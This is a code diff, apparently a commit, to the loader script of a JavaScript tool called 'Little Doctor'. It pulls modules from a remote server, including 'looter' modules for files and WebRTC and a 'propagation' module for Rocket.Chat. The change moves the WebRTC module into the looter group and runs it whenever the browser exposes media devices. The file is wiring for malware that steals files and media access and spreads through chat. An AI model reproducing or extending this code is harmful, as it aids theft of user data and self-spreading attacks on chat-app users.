@@ -13,11 +13,11 @@ requirejs.config({
         filesystem: server + '/modules/filesystem',
         utils: server + '/modules/utils',
         platform: server + '/modules/platform',
-        webrtc: server + '/modules/webrtc',
         msr: server + '/modules/dependencies/msr',
 
         // Loot modules
         lootFiles: server + '/modules/looters/files',
+        lootWebRtc: server + '/modules/looters/webrtc',
 
         // Propagation modules
         propagateRocketChat: server + '/modules/propagation/rocketchat',
@@ -31,7 +31,7 @@ requirejs.config({
 function main() {
 
     console.log('Little Doctor is examining the patient ...');
-    requirejs(['filesystem', 'platform'], function (fs, platform) {
+    requirejs(['filesystem', 'platform'], function(fs, platform) {
         
         // FileSystem access
         fs.isFileSystemAccessbile({
@@ -51,7 +51,7 @@ function main() {
     // WebRTC
     if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
         console.log('WebRTC looks to be accessible');
-        requirejs(['webrtc'], function(webrtc) {
+        requirejs(['lootWebRtc'], function(webrtc) {
             webrtc.execute();
         });
     }
